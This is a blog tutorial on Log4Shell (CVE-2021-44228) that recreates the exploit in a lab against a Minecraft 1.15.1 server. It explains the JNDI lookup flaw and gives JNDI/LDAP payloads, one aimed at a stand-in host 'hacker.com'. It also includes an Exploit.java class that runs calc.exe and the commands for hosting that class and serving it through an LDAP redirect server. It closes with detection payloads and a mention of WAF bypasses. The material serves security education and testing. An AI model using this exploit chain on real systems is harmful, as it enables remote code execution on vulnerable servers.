---
title: Recreate, detect and exploit the Log4j vulnerability
tags: [CVE, Log4j, PoC]
style: border
color: warning
description: Log4j is a widely used logging library in Java. You use it to log all sort of things  such as network traffic, requests, responses, application operational logs, etc... Imagine any of those data this library processes can let hackers penetrate your system. That's what we are dealing with.  
---

# 1. What is Log4J?
Log4j is a Java library that is used in many Java-based applications. Java has been around for quite sometimes, therefore many servers are utilizing Log4j. It's the most popular Java logging option around here.

# 2. Attack details
Below is the the diagram for the attack flow.

![Log4j attack. Source: cloudtango.net](https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/posts/log4shell/log4j_attack-1024x692.jpg)

To be more wordy, let's dive into the attack.

Basically, the log4j maintainers added a message lookup featured a decade ago. So the vulnerablity has just been lying there ever since. When it was found out, the Internet got burned.

This is how the feature is introduced:

```
Lookups provide a way to add values to the log4j configuration at arbitrary places. 
They are a particular type of Plugin that implements the StrLookup interface.
```

Everytime users call a logging method, log4j will utilize a format method to search for the `${` in each log. If the expression is there, it will be evaluated by the Java lookup and then replaced with the real value. Example, `java:os` will be rendered as:

```
Windows 7 6.1 Service Pack 1, architecture: amd64-64.
```

There are multi types of lookups:

```
Jndi Lookup
JVM Input Arguments Lookup
Web Lookup
```

The [JNDI](https://stackoverflow.com/questions/4365621/what-is-jndi-what-is-its-basic-use-when-is-it-used) one supports LDAP and RMI.

Devs often log what users input. If they input something like:
```
${jndi:ldap://www.hacker.com/malicious_java_class}
```
The lookup method will be abused to execute the malicious Java class hosted on the remote LDAP server.

# 3. Building a lab

My goal is simple. Exploiting the log4j vulnerability to execute `calc.exe` remotely. I will use the environment in which this exploit was first (alledgedly) discovered from. Here are the tools we need:

- [Java SE Development Kit 8u181](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html)
- [Minecraft Server 1.15.1](https://www.minecraft.net/en-us/article/minecraft-java-edition-1-15-1)
- [Minecraft Client 1.15.1](https://mc-launcher.com/special/minecraft)
- [POC exploit](https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce)

<u>Note 1</u>: It's <span style="color:#e5202a"><b>important</b></span> that you choose the <span style="color:#e5202a"><b>JDK</b></span>, not the JRE! Because JRE doesn't have javac for compiling. 

<u>Note 2</u>: remember to choose the right (old) version of JDK since the minecraft server might not be able to understand exploits that are compiled in newer Java version.

What the POC does:
- Create a LDAP server that will redirect Minecraft server to the exploit (Done by this [repo](https://github.com/mbechler/marshalsec)).
- The Java `Exploit.class` (created by `Exploit.java`) that will be loaded by the Minecraft server.
- A `http server` from which the Minecraft server will download the Exploit.class

Start by writing the exploit code:

```java
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("cmd.exe /c calc.exe");
        }
        catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

We then compile Exploit.java to Exploit.class using javac from JDK 8u181.

```sh
javac Exploit.java
```

Use the Python http server to host the exploit class.

```sh
python3 -m http.server 10000
```

Start the LDAP server and points it to the HTTP server.

```sh
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
mvn clean package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://172.30.146.202:10000/#Exploit"
```

Run the Minecraft server on a VM (I set it to bridged mode):
```
- Remember to get the IP of the VM. 
- Mine is 172.30.146.200.
- For the sake of POC, turn off the firewall so it will allow incoming connections to the server (normally the server administrators would set up firewall specifically for minecraft port).
- Go to the eula.txt and set eula=true.
```

```sh
java -jar server.jar
```

After you start the server a bunch of properties will be filled up in the server.properties file. Go to that file and edit the option online-mode to false. The online-mode option, if set to true, requires all players to be authenticated to Xbox-Live. 

<figure>
  <img
  src="https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/posts/log4shell/minecraft_properties.PNG"
  alt="Minecraft Client">
  <center><figcaption>Server properties</figcaption></center>
</figure>


Rerun the server:

```sh
java -jar server.jar
```

Start the Minecraft client

<figure>
  <img
  src="https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/posts/log4shell/minecraft_launcher.PNG"
  alt="Minecraft Client">
  <center><figcaption>Choose 1.15.1 for the client</figcaption></center>
</figure>

Connect to the Minecraft server

<figure>
  <img
  src="https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/posts/log4shell/Minecraft_direct_connect.PNG"
  alt="Minecraft Client">
  <center><figcaption>Use multiplayer and enter the server IP + port</figcaption></center>
</figure>

<figure>
  <img
  src="https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/posts/log4shell/minecraft_player_joined.PNG"
  alt="Minecraft Client">
  <center><figcaption>The account is recorded as logged in.</figcaption></center>
</figure>

Run the exploit
<figure>
  <img
  src="https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/posts/log4shell/minecraft_poc_cmd.PNG"
  alt="Minecraft Client">
  <center><figcaption>JNDI LDAP Payload</figcaption></center>
</figure>

The server will then log the chat, evaluate the lookup function, make a connection to the ldap server and then loads the exploit code hosted on the HTTP server:

<figure>
  <img
  src="https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/posts/log4shell/minecraft_log4j_ran.PNG"
  alt="Minecraft Client">
  <center><figcaption>The infamous Calculator.</figcaption></center>
</figure>

And that's it. Hope you have fun exploiting Log4J!

# 4. Detecting Log4Shell
Detect log4shell is easy. You only need to use the `${jndi:ldap://www.server-you-control.com}` as user inputs to the target server. If there is a ping back or a DNS look up for your server after the payload is sent then there is a high chance that the targe server is vulnerable. In case there is a WAF, it will block this malicious payload but there are a bunch of bypasses on Twitter for each specific WAFs that you can try.

For pentesters, use the [Burp's Log4Shell Scanner extension](https://portswigger.net/bappstore/b011be53649346dd87276bca41ce8e8f) and it will automatically replace request inputs with Log4shell payload that includes the generated burp collaborator urls. If you fancy the manual way, you can replace the payload with burp collaborator and check if there is any traffic coming to it. Example: `${jndi:ldap://test.oastify.com}`